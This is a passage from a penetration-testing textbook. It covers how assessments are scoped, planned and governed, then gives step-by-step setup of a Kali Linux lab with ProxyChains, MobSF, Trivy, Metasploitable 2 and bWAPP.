In this approach, the Pen tester receives not only the IP addresses, URLs, APKs, IPAs, APIs etc. but also a detailed walkthrough of the target to comprehend its internal functionality. This type of assessment is referred to as authenticated VAPT since the Pen tester is provided with some level of login credentials. It lies between a black box and a white box in terms of target knowledge and authentication.

[White box](#contents.xhtml_sc4_41a)

In this scenario, the Pen tester will possess comprehensive knowledge of the target’s architecture, data flow, and source code. With complete access to the target, the pen tester can perform deep dive and logical testing, leading to enhanced scan quality.

| Note: Thoughtful evaluation of the advantages and disadvantages of the exercise is imperative when choosing the suitable testing approach, as each method will follow a unique approach and produce varying outcomes. |

[Environment selection](#contents.xhtml_sc3_42a)

VAPT can be conducted in multiple phases of the secure Software Development Life Cycle (SDLC), including unit-based testing during development, initial testing in UAT, full-fledged testing in pre-prod, and routine testing in production. Each test environment offers distinct advantages and limitations to the test results. For instance, in production, grey box VAPT can provide a realistic attack simulation, but it also carries the risk of disrupting production or damaging the database.

[Approach and methodology selection](#contents.xhtml_sc3_43a)

The approach and methodology can be chosen based on various parameters, including the defined scope, test method, test environment, and exercise nature. While the auditor typically follows standardized approaches, minor adjustments may be made if needed.

[Exercise time selection](#contents.xhtml_sc3_44a)

The audit timing should be chosen based on the business nature and the client’s requirements. For critical and production environments, it is advisable to schedule audits during periods of lowest user traffic, which may include off-hours, nighttime, or weekends.

[Project timeline](#contents.xhtml_sc3_45a)

The timeline of the project is determined by the size and nature of the defined scope mentioned in the SOW. For instance, grey or white box testing may require a longer period due to the inclusion of manual fuzzing. The detailed project plan can be shared during the kickoff call.

[Rules of engagement](#contents.xhtml_sc3_46a)

Any necessary terms and conditions for the VAPT exercise must be documented and signed by both the auditee and the auditing organization. For instance, in the event of a production server crash during the VAPT exercise, leading to financial losses for the organization, a provision may be included for financial insurance to be provided by the auditing organization.

[Deliverables](#contents.xhtml_sc3_47a)

The exercise’s ultimate success hinges on delivering the promised outcomes. Rely on your knowledge, wisdom, and experience to commit to deliverables in terms of format and quality, as you will be held accountable to deliver accordingly. Failure to meet expectations may result in multiple escalations. The final chapter will provide a comprehensive exploration of deliverables.

VAPT assessments typically involve several deliverables, including:

*   Executive summary report

*   Detailed technical assessment report

*   Vulnerability management tracker

[Designing the Scope of Work for security audits](#contents.xhtml_sc2_48a)

The Scope of Work (SOW) is the primary document presented to the customer after the initial engagement, required to obtain the purchase order. This document holds paramount importance in VAPT, as it outlines the specific areas where the proposed exercise will take place. Packed with comprehensive information, the SOW proves beneficial to both the auditee and the auditing organization throughout the entire process.

The SOW document covers the following points:

*   Information about the service-providing organization

*   Document introduction

*   Detailed agreement on the scope

*   Costing and manpower allocation

*   Elaborate approach and methodology

*   Adherence to standards and frameworks

*   Testing methods and nature of the exercise

*   Necessary toolset

*   Capability to conduct the exercise

*   Exercise cycle

*   Deliverables

*   Service terms and conditions

| Note: While the Scope of Work (SOW) primarily serves as a technical document, it also possesses substantial importance as vital legal evidence in cases related to scope creep. |

[Project planning and governance in VAPT](#contents.xhtml_sc2_49a)

Now, let us delve into the intricacies of project planning, management, and governance.

[Project planning](#contents.xhtml_sc3_50a)

To ensure the VAPT project meets its promised delivery time and achieves success, careful planning and monitoring are essential. This document serves as a guide for both the auditee and auditing organization, providing a concise overview of completed, ongoing, and upcoming tasks.

Effective project planning should encompass the following elements:

*   Project scope (as per SOW)

*   Task descriptions and priorities

*   Time limits for task completion

*   Task sequencing

*   List of IT and non-IT support staff

Among various project planning techniques, the Gantt chart stands out as one of the most widely used and effective methods. A Gantt chart arranges project activities in order of priority, displaying the start and end dates for each task. Resource names can be added for accountability. It clearly shows which activities will run simultaneously and which ones will occur sequentially. By glancing at the chart, project progress can be easily assessed – whether it is on track, ahead of schedule, or falling behind.

Gantt charts provide valuable insights, enabling project managers to identify potential bottlenecks or delays and allowing them to communicate the project plan to stakeholders efficiently, as depicted in [Figure 1.5](#ch01.xhtml_fig1-5). When needed, adjustments can be made, such as adding more resources or accelerating work pace to keep the project on schedule. Please refer to the following figure:

![](images/Figure_1.5.png)

Figure 1.5: Gantt chart

[Project management](#contents.xhtml_sc3_51a)

Project management encompasses a diverse array of activities aimed at achieving the practice’s defined objectives. Each project is assigned a dedicated project manager, ensuring comprehensive centralized control. Effective project management is crucial to maintaining profitability, ensuring timely completion and budget adherence. For anyone involved in leading or managing projects, project management is an indispensable skill that facilitates the efficient utilization of resources.

The project management life cycle comprises project initiation, planning, execution, control, monitoring, and closure, as illustrated in [Figure 1.6](#ch01.xhtml_fig1-6):

![](images/Figure_1.6.png)

Figure 1.6: Project management life cycle

Numerous project management tools and techniques are at your disposal to effectively control time and resource utilization. By harmonizing the relationships among essential project management elements, such as resources, deliverables, budget, and duration, you can develop a profitable and all-encompassing plan. Refer to [Figure 1.7](#ch01.xhtml_fig1-7) to gain insights into the interconnections among multiple project elements:

![](images/Figure_1.7.png)

Figure 1.7: Relationship between project elements

Establishing a Project Management Office (PMO) can enhance project management quality and ensure successful outcomes.

[Project governance](#contents.xhtml_sc3_52a)

To ensure successful project execution, a well-defined governance model and centralized control mechanisms are essential, aligning with the exercise objectives. Decisions within this governance should be rooted in tangible factors like scope, cost, quality, time, and deliverables. However, certain intangible factors, such as team conflicts, leadership issues, cultural disparities, environmental changes, and political concerns, may also influence final decisions. Roles and responsibilities should be tailored to the project’s complexity to establish effective governance.

Roles and responsibilities can be grouped as follows:

*   Project steering committee

*   Project manager

*   Quality assurance

*   People manager

*   Engineering and technical manager

*   Subject Matter Expert (SME) team

[Delivery and customer success tactics in VAPT](#contents.xhtml_sc2_53a)

Customer Success Management is a strategic approach focusing on maximizing the benefits of VAPT services for customers. Delivering services as promised, within the agreed timeline and with uncompromising quality plays a crucial role in building trust with customers. To ensure lasting customer relationships and foster sustainable growth, consider implementing the following best customer success tactics:

*   Proactive communication: Keep customers informed about VAPT progress and promptly address their concerns. Proactive communication boosts confidence in our services.

*   Personalized attention: Understand each customer’s unique needs and tailor VAPT solutions accordingly. We genuinely care about their security, offering customized recommendations.

*   Knowledge sharing: Educate customers about cybersecurity best practices and emerging threats, empowering them to make informed decisions.

*   Post-assessment support: Provide post-assessment assistance, including remediation recommendations and ongoing support for effective security measures.

*   Customer feedback: Collect customer feedback after each engagement to continuously improve our services.

*   Measure customer success: Gauge customer satisfaction and success using established metrics, enabling us to optimize our customer success strategies.

*   Long-term relationship: Focus on building long-term relationships, showing dedication to their security needs, and earning their loyalty.

Additionally, there may be a need for escalation metrics and out-of-the-box support.

| Note: Ensure effective and open communication with clients throughout the entire project. Engage them in decision-making, attentively consider their feedback, and promptly address any issues. By working together collaboratively, trust is built, client relationships are strengthened, and project success is enhanced. |

[Conclusion](#contents.xhtml_sc2_54a)

You have acquired a comprehensive understanding of the advanced VAPT approach and methodology. Adhering to VAPT standards and frameworks can significantly streamline the execution of VAPT exercises, guaranteeing comprehensive and effective assessments. Comprehending the theoretical approach to advanced VAPT is crucial for individuals seeking to delve deeper into the underlying concepts and principles.

Effective identification and exploitation of vulnerabilities in a system or network require security professionals equipped with critical thinking and problem-solving skills. In the subsequent chapter, we will explore the process of setting up a comprehensive, advanced VAPT test lab utilizing open-source and freeware tools. These labs offer a valuable platform for security professionals to practice, refine, and augment their skills and knowledge in VAPT. Designed to emulate real-world systems and networks, VAPT labs provide a controlled environment for professionals to experiment with their techniques and methodologies.

[References](#contents.xhtml_sc2_55a)

*   [https://attack.mitre.org/matrices/enterprise/](https://attack.mitre.org/matrices/enterprise/)

*   [https://owasp.org/www-project-mobile-top-10/](https://owasp.org/www-project-mobile-top-10/)

*   [https://owasp.org/www-project-top-ten/](https://owasp.org/www-project-top-ten/)

*   [https://www.sans.org/top25-software-errors/](https://www.sans.org/top25-software-errors/)

*   [http://www.pentest-standard.org/index.php/Main_Page](http://www.pentest-standard.org/index.php/Main_Page)

*   [https://www.isecom.org/OSSTMM.3.pdf](https://www.isecom.org/OSSTMM.3.pdf)

*   [https://www.nist.gov/cyberframework](https://www.nist.gov/cyberframework)

*   [https://en.wikipedia.org/wiki/ISO/IEC_27001](https://en.wikipedia.org/wiki/ISO/IEC_27001)

*   [https://www.cisecurity.org/cis-benchmarks/](https://www.cisecurity.org/cis-benchmarks/)

*   [https://www.isaca.org/resources/isaca-journal/issues/2020/volume-6/standards-guidelines-tools-and-techniques](https://www.isaca.org/resources/isaca-journal/issues/2020/volume-6/standards-guidelines-tools-and-techniques)

Join our book’s Discord space

Join the book's Discord Workspace for Latest updates, Offers, Tech happenings around the world, New Release and Sessions with the Authors:

**[https://discord.bpbonline.com](https://discord.bpbonline.com)**

![](images/fm1.png)

# [CHAPTER 2Setting up the VAPT Lab](#contents.xhtml_ch02a)

[Introduction](#contents.xhtml_sc2_56a)

In this chapter, we will guide you through setting up an advanced VAPT test lab using free and open-source tools. A VAPT lab typically comprises interconnected computer systems and network devices like routers, servers, applications, and switches. These systems are configured to simulate a real-world network, complete with security vulnerabilities and measures.

Having a VAPT lab is essential for VAPT professionals. It provides a safe and controlled environment for honing their expertise. Moreover, there could be serious legal consequences without proper authorization. In a VAPT lab, experts can conduct tests and simulations without risking damage to actual systems or networks. This allows for learning and experimentation without the fear of real-world fallout. This, in turn, aids in creating targeted VAPT strategies, uncovering vulnerabilities, and fortifying their own systems and networks.

| Note: A VAPT lab stands as a vital asset for VAPT practitioners, furnishing a secure and productive setting to practice, learn, and enhance their VAPT skills. |

[Structure](#contents.xhtml_sc2_57a)

In this chapter, we will discuss the following topics:

*   Initiating with Kali Linux

*   Establishing the virtualization landscape

*   Deploying Kali Linux 2023.2

*   Arranging network services

*   Enabling ProxyChains

*   Personalizing Kali Linux

*   Refreshing Kali Linux

*   Enabling third-party VAPT tools

*   Preparing vulnerable systems and applications

*   Setting up vulnerable machines and applications

[Initiating with Kali Linux](#contents.xhtml_sc2_58a)

Kali Linux stands as a cost-free and open-source Linux operating system designed for digital forensics, penetration testing, and security exploration. Crafted and upheld by Offensive Security, a respected company in information security training, Kali Linux is founded on the Debian GNU/Linux platform. Packed with a diverse range of tools, it arrives pre-equipped, streamlining the execution of multiple security chores like scanning networks, assessing vulnerabilities, and breaking passwords. With its robust capabilities and adaptable design, Kali Linux is the favored pick for cybersecurity specialists and researchers.

[Kali Linux features](#contents.xhtml_sc3_59a)

Kali Linux serves as a dynamic and flexible instrument for experts in cybersecurity and research, presenting a broad array of capabilities that position it as an excellent option for diverse undertakings. [Figure 2.1](#ch02.xhtml_fig2-1) showcases a few pivotal attributes of Kali Linux, which are expounded upon in the subsequent explanations:

![](images/Figure_2.1.png)

Figure 2.1: Kali Linux key features

The following are some of the key features of Kali Linux:

*   A wide collection of security tools already installed, covering network scanning, password cracking, and digital forensic analysis.

*   An adaptable interface and a versatile layout, empowering users to personalize the operating system according to their exact requirements.

*   Strong documentation and support resources, featuring a user guide, forums, and a lively Kali Linux community.

*   Regular upgrades and improvements, ensuring users can employ the most up-to-date and efficient security methods and tools.

*   A live boot feature allowing users to use Kali Linux from a DVD or USB drive, bypassing the need for installation on their device.

| Note: Kali Linux, a prominent Linux distribution, is widely recognized for its pivotal role in cybersecurity pursuits, encompassing ethical hacking and penetration testing. While its conventional deployment leans towards offensive security, Kali Purple redefines the platform’s scope. It seamlessly integrates a diverse range of defensive tools and resources, empowering you to not only proactively detect and counteract cyber threats but also adeptly respond to and mitigate them. |

[Establishing the virtualization landscape](#contents.xhtml_sc2_60a)

Virtualization stands as a method that empowers one real machine to be divided into several virtual machines, each with the ability to operate its distinct operating system and apps. This approach permits various operating systems and applications to function on just one physical device, boosting efficiency and curbing hardware costs. The practice of virtualization finds use across various situations, including cloud computing, consolidating servers, and crafting test and development settings. Software designed for virtualization, such as VMware and Oracle VirtualBox, plays the role of forming and overseeing these virtual machines on a central host machine.

[How is it useful in VAPT](#contents.xhtml_sc3_61a)

Virtualization plays a pivotal role in Vulnerability Assessment and Penetration Testing (VAPT) by empowering security experts to establish and manage numerous virtual environments exclusively for testing purposes. Through virtualization, VAPT specialists can erect multiple virtual machines on a single physical host, each tailored with unique operating systems, applications, and network setups.

This technique also simplifies crafting isolated test settings, which are vital for guaranteeing that the testing process does not interfere with the functioning of the systems under scrutiny. Moreover, virtualization streamlines the creation of snapshots of a virtual environment, enabling VAPT professionals to efficiently preserve and revert to specific states. This feature proves valuable for repetitive testing or sharing testing environments with fellow team members.

| Note: Virtualization stands as a prized technology among VAPT experts, granting them the capability to thoroughly and adeptly scrutinize the security of diverse systems and environments. |

[Deploying Kali Linux 2023.2](#contents.xhtml_sc2_62a)

You can set up Kali Linux in VMware using either the ISO image or the virtual image. Each approach comes with its own strengths and weaknesses, and your choice depends on what you need and how well you know Kali Linux. For a comparison of the pros and cons of each method, take a look at [Table 2.1](#ch02.xhtml_tab2-1):

| S. No. | Aspects | ISO Image | Virtual Image |
| 01 | Ease of installation | Slightly more complex in installation but offers more customization options | Offers a quick and easy setup without the need for customizations |
| 02 | Customization | Allows you to customize installation options, such as disk partitioning, language, and software packages | Provides limited customization options compared to the ISO method, which may not be suitable for those with specific requirements |
| 03 | Recommendation | Recommended for those who want to learn the installation process and have specific customization needs | Ideal for users who are already familiar with Kali Linux and want to get up and running quickly without any additional setup steps |

Table 2.1: Comparison of benefits and drawbacks between ISO and virtual installation methods for Kali Linux

For Kali Linux installation using the ISO image method, begin by fetching the ISO image file from the official website. Then, generate a fresh virtual machine in VMware, selecting the ISO image file as the installation medium. Abide by the on-screen cues to finalize the installation. This method offers full authority during installation and enables customization of setup choices.

In this section, we will guide you through installing Kali Linux on a VMware Workstation or VirtualBox via virtual images. Let us jump right in and delve into the installation steps.

[Installing Kali Linux on VMware workstation](#contents.xhtml_sc3_63a)

To install a Kali Linux virtual image on VMware workstation, you will need to perform the following steps:

1.  Download the latest version of Kali Linux virtual image from the website as depicted in [Figure 2.2](#ch02.xhtml_fig2-2):

    Virtual image download URL: [https://www.kali.org/get-kali/#kali-virtual-machines](https://www.kali.org/get-kali/#kali-virtual-machines):

    ![](images/Figure_2.2.png)

    Figure 2.2: Download Kali Linux virtual image

2.  Install VMware Workstation on your device and open it, as shown in [Figure 2.3](#ch02.xhtml_fig2-3):

    ![](images/Figure_2.3.png)

    Figure 2.3: VMware workstation

3.  Click on Open a Virtual Machine in the VMware Workstation welcome screen.

4.  Next, select the Kali Linux virtual image file that you obtained in step 1, then click on Open as illustrated in [Figure 2.4](#ch02.xhtml_fig2-4):

    ![](images/Figure_2.4.png)

    Figure 2.4: Select the Kali Linux virtual image file

5.  Carefully follow the on-screen instructions to complete the setup of your virtual machine. This includes specifying the amount of memory and storage to allocate, as well as configuring the virtual network settings, as depicted in [Figure 2.5](#ch02.xhtml_fig2-5):

    ![](images/Figure_2.5.png)

    Figure 2.5: Virtual machine setup

6.  Start the virtual machine and follow the on-screen instructions to complete the Kali Linux installation process, as depicted in [Figure 2.6](#ch02.xhtml_fig2-6):

    ![](images/Figure_2.6.png)

    Figure 2.6: Start the virtual machine

7.  Login with the default credentials: Username – kali, Password – kali, as depicted in [Figure 2.7](#ch02.xhtml_fig2-7):

    ![](images/Figure_2.7.png)

    Figure 2.7: Login with the default credentials

| Note: Our suggestion is to exclusively opt for ISO-based Kali installation, as it offers greater customization flexibility. However, virtual images can also adequately meet the needs of penetration testers. |

[Installing Kali Linux on VirtualBox](#contents.xhtml_sc3_64a)

The approach to install a virtual image of Kali Linux on VirtualBox is to follow these steps:

1.  First, you will need to download and install VirtualBox on your computer, as depicted in [Figure 2.8](#ch02.xhtml_fig2-8):

    ![](images/Figure_2.8.png)

    Figure 2.8: Download and install VirtualBox

2.  Next, download the Kali Linux virtual image as depicted in [Figure 2.9](#ch02.xhtml_fig2-9):

    Virtual image download URL: [https://www.kali.org/get-kali/#kali-virtual-machines](https://www.kali.org/get-kali/#kali-virtual-machines)

    ![](images/Figure_2.2.png)

    Figure 2.9: Download the Kali Linux virtual image

3.  Open VirtualBox and click on the Add button. Follow the prompts to import the virtual image into VirtualBox as depicted in [Figure 2.10](#ch02.xhtml_fig2-10):

    ![](images/Figure_2.10.png)

    Figure 2.10: Import the virtual image into VirtualBox

4.  Once the virtual image has been imported, you must configure the virtual machine. This includes setting the amount of memory and CPU resources that the virtual machine will use, as well as configuring the network settings as depicted in [Figure 2.11](#ch02.xhtml_fig2-11):

    ![](images/Figure_2.11.png)

    Figure 2.11: Configuring the network settings

5.  Now, you can start it by clicking on the Start button. This will boot the virtual machine and load the Kali Linux operating system.

6.  Login with the default credentials: Username – kali, Password – kali, as depicted in [Figure 2.12](#ch02.xhtml_fig2-12):

    ![](images/Figure_2.12.png)

    Figure 2.12: Login with the default credentials

[Arranging network services](#contents.xhtml_sc2_65a)

For configuring network settings in Kali Linux 2023.2, employ the nmtui command-line utility, offering an uncomplicated text-based interface tailored to set up network connections effortlessly.

To open the nmtui utility, run the command sudo nmtui, as depicted in [Figure 2.13](#ch02.xhtml_fig2-13):

![](images/Figure_2.13.png)

Figure 2.13: Run the command ‘sudo nmtui’

To configure a new network connection, you can follow these steps:

1.  From the main menu, select Edit a network connection, as depicted in [Figure 2.14](#ch02.xhtml_fig2-14):

    ![](images/Figure_2.14.png)

    Figure 2.14: Edit a network connection

2.  Select the network connection that you want to edit and press Enter, as depicted in [Figure 2.15](#ch02.xhtml_fig2-15):

    ![](images/Figure_2.15.png)

    Figure 2.15: Select the network connection

3.  Use the arrow keys to navigate to the different options and press Enter to edit them.

4.  Use the Tab key to switch between the different options and use the Space key to enable or disable them.

5.  Set the connection to use a manual configuration and assign a static IP address to the Kali Linux machine as depicted in [Figure 2.16](#ch02.xhtml_fig2-16):

    ![](images/Figure_2.16.png)

    Figure 2.16: Edit connection

6.  Press OK to save your changes.

| Note: The nmtui utility further offers the capability to toggle network connections on or off, along with providing access to reviewing and modifying the system’s hostname and DNS configurations. |

[Enabling ProxyChains](#contents.xhtml_sc2_66a)

Employing ProxyChains can enhance your privacy safeguards and bypass network limitations such as firewalls. While ProxyChains is already included in Kali Linux 2023.2, it remains beneficial to grasp its installation and setup to ensure readiness for other platforms or tailored adjustments. Acquiring insight into ProxyChains’ workings and mastering its setup elevates your ability to engage in secure and confidential network interactions.

To set up Proxychains in Kali Linux 2023.2, need to perform the following steps:

1.  Open a terminal window and run the command sudo apt-get install proxychains to install the Proxychains package, as depicted in [Figure 2.17](#ch02.xhtml_fig2-17):

    ![](images/Figure_2.17.png)

    Figure 2.17: Run command to install ProxyChains

2.  Open the Proxychains configuration file using a text editor. The configuration file is located at /etc/proxychains.conf. Run the command Sudo nano /etc/proxychains.conf as depicted in [Figure 2.18](#ch02.xhtml_fig2-18):

    ![](images/Figure_2.18.png)

    Figure 2.18: Run the command to open ProxyChain configuration file

3.  Scroll down to the bottom of the file and add the proxy servers you want to use, one per line. Each line should have the following format:

    <proxy type> <proxy host> <proxy port>

4.  For example, if you want to use a SOCKS5 proxy at 192.168.159.150 on port 7080, you will add the following line to the configuration file as depicted in [Figure 2.19](#ch02.xhtml_fig2-19):

    socks5 192.168.159.150 7080

    ![](images/Figure_2.19.png)

    Figure 2.19: ProxyChains configuration file

5.  Save the configuration file and exit the text editor.

[Use cases of ProxyChains](#contents.xhtml_sc3_67a)

To use Proxychains with a specific command, you can use the following syntax:

proxychains <command>

For example, to run the Nmap network scanning tool through a proxy server, you would use the command proxychains nmap 192.168.159.120 as depicted in [Figure 2.20](#ch02.xhtml_fig2-20):

![](images/Figure_2.20.png)

Figure 2.20: Using NMAP with ProxyChains

This will run Nmap through the proxy server that you specified in the configuration file, allowing you to conceal your IP address and protect your anonymity.

| Note: The choice of proxy utilized with ProxyChains hinges on the unique preferences and demands of the user. |

[Personalizing Kali Linux](#contents.xhtml_sc2_68a)

Tailoring Kali Linux 2023.2 to your preferences involves a variety of options, such as altering the desktop appearance, adding new software, and adjusting system configurations.

Here are a few instances of how you can personalize your Kali Linux experience:

[Changing the desktop environment](#contents.xhtml_sc3_69a)

By default, Kali Linux employs the Xfce desktop setup. However, you have the option to install and switch to other desktop environments like KDE, Gnome, or Cinnamon for a fresh visual and operational style that suits your taste better.

To install the Kali Linux Xfce environment, open a terminal session and enter the command sudo apt update && sudo apt install -y kali-desktop-xfce as depicted in [Figure 2.21](#ch02.xhtml_fig2-21):

![](images/Figure_2.21.png)

Figure 2.21: Install Xfce environment in Kali Linux

To set Xfce as your default desktop environment in Kali Linux, open a terminal and run the command sudo update-alternatives --config x-session-manager as depicted in [Figure 2.22](#ch02.xhtml_fig2-22):

![](images/Figure_2.22.png)

Figure 2.22: Desktop environments in Kali Linux

[Installing additional applications](#contents.xhtml_sc3_70a)

Kali Linux includes numerous security tools ready for use, yet you also have the option to add extra applications that are not there initially. This is handy when you intend to employ Kali Linux beyond security assessments, like for web development or multimedia editing.

[Modifying system settings](#contents.xhtml_sc3_71a)

In Kali Linux, you can access different setting panels and tools that let you personalize different parts of the system. You can tweak things like the desktop background, the system theme, and even network settings, as shown in [Figure 2.23](#ch02.xhtml_fig2-23):

![](images/Figure_2.23.png)

Figure 2.23: Modifying system settings

[Changing the login screen](#contents.xhtml_sc3_72a)

You can use the lightdm-gtk-greeter-settings utility to customize the appearance of the login screen, including the background image, the font, and the logo. Run the command sudo lightdm-gtk-greeter-settings as depicted in [Figure 2.24](#ch02.xhtml_fig2-24):

![](images/Figure_2.24.png)

Figure 2.24: Changing the login screen

| Note: Prior to making any customizations, it is important to conduct thorough research to ensure they are safe and suitable for your system. This precautionary step aids in avoiding potential issues stemming from unsuitable or unsupported modifications. |

[Refreshing Kali Linux](#contents.xhtml_sc2_73a)

To update Kali Linux 2023.2, you can use the apt-get command-line utility, which is the package manager for the Debian GNU/Linux distribution that Kali Linux is based on.

To update Kali Linux, you will need to perform the following steps:

1.  Open a terminal window and run the command sudo apt-get update to update the Kali Linux, as depicted in [Figure 2.25](#ch02.xhtml_fig2-25):

    ![](images/Figure_2.25.png)

    Figure 2.25: Update the Kali Linux

2.  Once the package index has been updated, run the command sudo apt-get upgrade to upgrade all installed packages to their latest versions, as depicted in [Figure 2.26](#ch02.xhtml_fig2-26):

    ![](images/Figure_2.26.png)

    Figure 2.26: Upgrade the Kali Linux

3.  After the package upgrades are complete, you can run the command sudo apt-get autoremove to remove any obsolete packages that are no longer needed, as depicted in [Figure 2.27](#ch02.xhtml_fig2-27).

    This will clean up your system and free up disk space. Please refer to [Figure 2.27](#ch02.xhtml_fig2-27):

    ![](images/Figure_2.27.png)

    Figure 2.27: Clean up your system

4.  Finally, you can run the command sudo apt-get clean to clean the package cache, which will remove any downloaded package files that are no longer needed, as depicted in [Figure 2.28](#ch02.xhtml_fig2-28):

    ![](images/Figure_2.28.png)

    Figure 2.28: Command to clean the package cache

| Note: Prior to initiating updates or upgrades, it is advisable to create backups of essential data. This precautionary measure ensures your ability to restore data in case any issues arise during the update or upgrade procedure. |

[Enabling third-party VAPT tools](#contents.xhtml_sc2_74a)

In the pursuit of airtight security, two powerful tools that deserve a closer look are Mobile Security Framework (MobSF) and Trivy. These versatile cybersecurity solutions play crucial roles in assessing and fortifying your digital defenses. In the following sections, we will delve into how to harness the capabilities of MobSF and Trivy.

Let us look at how to set up these third-party VAPT tools in the following:

[MobSF framework](#contents.xhtml_sc3_75a)

MobSF stands as a complete toolkit for testing the security of mobile apps, working with both Android and iOS. It is free and open-source, loaded with tools like analysis, decompilation, and vulnerability scanning. Using MobSF helps spot and fix app weaknesses before hackers exploit them, lessening the chances of data breaches and other security problems for organizations.

To get MobSF running on Kali Linux 2023.2, follow these steps:

1.  Update the package list on your Kali Linux system by running the command sudo apt-get update.

2.  Download the MobSF package by running the command git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF --depth=1, as depicted in [Figure 2.29](#ch02.xhtml_fig2-29):

    ![](images/Figure_2.29.png)

    Figure 2.29: Download the MobSF package

3.  Install the dependencies required to run MobSF by running the command sudo apt install python3-dev python3-venv python3-pip build-essential libffi-dev libssl-dev libxml2-dev libxslt1-dev libjpeg62-turbo-dev zlib1g-dev wkhtmltopdf, as depicted in [Figure 2.30](#ch02.xhtml_fig2-30):

    ![](images/Figure_2.30.png)

    Figure 2.30: Install the dependencies

4.  Install the MobSF by running the command sudo ./setup.sh as depicted in [Figure 2.31](#ch02.xhtml_fig2-31):

    ![](images/Figure_2.31.png)

    Figure 2.31: Install the MobSF

5.  Start the MobSF server by running the command sudo ./run.sh, as depicted in [Figure 2.32](#ch02.xhtml_fig2-32):

    ![](images/Figure_2.32.png)

    Figure 2.32: Start the MobSF

6.  Open a web browser and go to the URL http://0.0.0.1:8000 to access the MobSF web interface as depicted in [Figure 2.33](#ch02.xhtml_fig2-33):

![](images/Figure_2.33.png)

Figure 2.33: MobSF web interface

You can also refer to the official MobSF documentation for more detailed instructions on setting up and using the tool: [https://github.com/MobSF/Mobile-Security-Framework-MobSF/wiki/Installation-Guide](https://github.com/MobSF/Mobile-Security-Framework-MobSF/wiki/Installation-Guide)

| Note: MobSF empowers organizations to enhance the security of their mobile apps, offering robust defense against potential attacks and ensuring the protection of crucial data. |

To set up Mobile Security Framework (MobSF) using Docker in Kali Linux, follow these steps:

1.  Install Docker: Open a terminal and enter the command sudo apt install docker.io, as shown in [Figure 2.34](#ch02.xhtml_fig2-34) to install Docker on your system:

    ![](images/Figure_2.34.png)

    Figure 2.34: Install Docker

2.  Start Docker: Once the installation is complete, start the Docker service by running the command sudo systemctl start docker, as shown in [Figure 2.35](#ch02.xhtml_fig2-35):

    ![](images/Figure_2.35.png)

    Figure 2.35: Start Docker

3.  Pull MobSF Docker Image: To download the MobSF Docker image from the Docker Hub, open a terminal and execute the command sudo docker pull opensecurity/mobile-security-framework-mobsf, as shown in [Figure 2.36](#ch02.xhtml_fig2-36). This command will retrieve the MobSF Docker image and save it on your system:

    ![](images/Figure_2.36.png)

    Figure 2.36: Pull MobSF Docker image

4.  Run MobSF Container: After the image is successfully downloaded, launch a MobSF container by running the command sudo docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf, as shown in [Figure 2.37](#ch02.xhtml_fig2-37). This command will create and start the container with MobSF:

    ![](images/Figure_2.37.png)

    Figure 2.37: Run MobSF container

5.  Access MobSF Web Interface: Open a web browser and navigate to http://localhost:8000, to access the MobSF web interface as shown in [Figure 2.38](#ch02.xhtml_fig2-38). This interface allows you to interact with MobSF and perform mobile security testing and analysis:

    ![](images/Figure_2.38.png)

    Figure 2.38: Access MobSF web interface

| Note: For a straightforward MobSF installation using Docker, just fetch the Docker image from “opensecurity/mobile-security-framework-mobsf”. This hassle-free approach enables rapid and simple MobSF setup. Docker’s notable benefit lies in its capability to circumvent the complexities of Python and other prerequisites. |

[Trivy](#contents.xhtml_sc3_76a)

Trivy stands as a simple yet thorough container vulnerability scanner tailored for CI/CD pipelines. Installing it on Kali Linux is a breeze, and you can access it through a command-line interface.

Here is how you can set it up:

1.  First, download the Trivy installation script using the command wget https://github.com/aquasecurity/trivy/releases/download/v0.18.3/trivy_0.18.3_Linux-64bit.deb, as depicted in [Figure 2.39](#ch02.xhtml_fig2-39):

    ![](images/Figure_2.39.png)

    Figure 2.39: Download the Trivy installation script

2.  Install Trivy using the command sudo dpkg -i trivy_0.18.3_Linux-64bit.deb, as depicted in [Figure 2.40](#ch02.xhtml_fig2-40):

    ![](images/Figure_2.40.png)

    Figure 2.40: Install Trivy

3.  Once Trivy is installed, you can use it to scan a container image for vulnerabilities by running the command trivy image_name, as depicted in [Figure 2.41](#ch02.xhtml_fig2-41):

    ![](images/Figure_2.41.png)

    Figure 2.41: Trivy

For added personalization, you have the option to define extra settings for the scan. These could involve setting the severity level of reported vulnerabilities or specifying particular package names for scanning. To delve deeper and explore a complete range of options, you can check out the Trivy documentation at [https://github.com/aquasecurity/trivy](https://github.com/aquasecurity/trivy).

| Note: Amid the rising utilization of containers for deploying and running applications in cloud environments, container security becomes a pivotal element of cybersecurity. |

[Setting up vulnerable machines and applications](#contents.xhtml_sc2_77a)

Now, let us explore the process of configuring different vulnerable machines and applications by examining the steps involved:

[Setting up Metasploitable 2](#contents.xhtml_sc3_78a)

Metasploitable 2 serves as a deliberately weak virtual machine designed to explore and demonstrate the features of the Metasploit framework. It is a valuable tool for honing hacking abilities, testing security methods, and delving deeper into how the Metasploit framework operates.

To set up Metasploitable 2 on VMware, you will need to perform the following steps:

1.  Acquire the Metasploitable 2 virtual machine image by visiting the Rapid7 website at https://information.rapid7.com/download-metasploitable-2017.html, as illustrated in [Figure 2.42](#ch02.xhtml_fig2-42):

    ![](images/Figure_2.42.png)

    Figure 2.42: Download the Metasploitable 2

2.  Use VMware Workstation or VirtualBox to import the Metasploitable 2 virtual machine image that you downloaded in step 1 as depicted in [Figure 2.43](#ch02.xhtml_fig2-43):

    ![](images/Figure_2.43.png)

    Figure 2.43: Import the Metasploitable 2 virtual machine

3.  Start the virtual machine and follow the on-screen instructions to complete the setup process. Try to log in with the default credentials: Username – msfadmin, Password – msfadmin, as depicted in [Figure 2.44](#ch02.xhtml_fig2-44):

    ![](images/Figure_2.44.png)

    Figure 2.44: Login with the default credentials

| Note: There are a plethora of options available for boosting VAPT skills, and the best choice depends on the specific goals and needs of the individual or organization. |

[Setting Up BWAPP](#contents.xhtml_sc3_79a)

BWAPP, also known as the Buggy Web Application, is a deliberately insecure web app used for training and security testing. It helps experts grasp typical web app vulnerabilities like SQL injection, cross-site scripting, and other attacks. BWAPP is open-source, free to download, and can be employed by anyone. For the best results in terms of performance and security, it is advisable to run BWAPP on a dedicated Windows Virtual Machine (VM).

To set up BWAPP on a Windows VM, you will need to follow these steps:

1.  Download and install the latest version of XAMPP on your Windows VM. This will provide a local server environment for BWAPP.

2.  Download the latest version of BWAPP from its official website and extract the files to the htdocs folder in the XAMPP installation directory as depicted in [Figure 2.45](#ch02.xhtml_fig2-45):

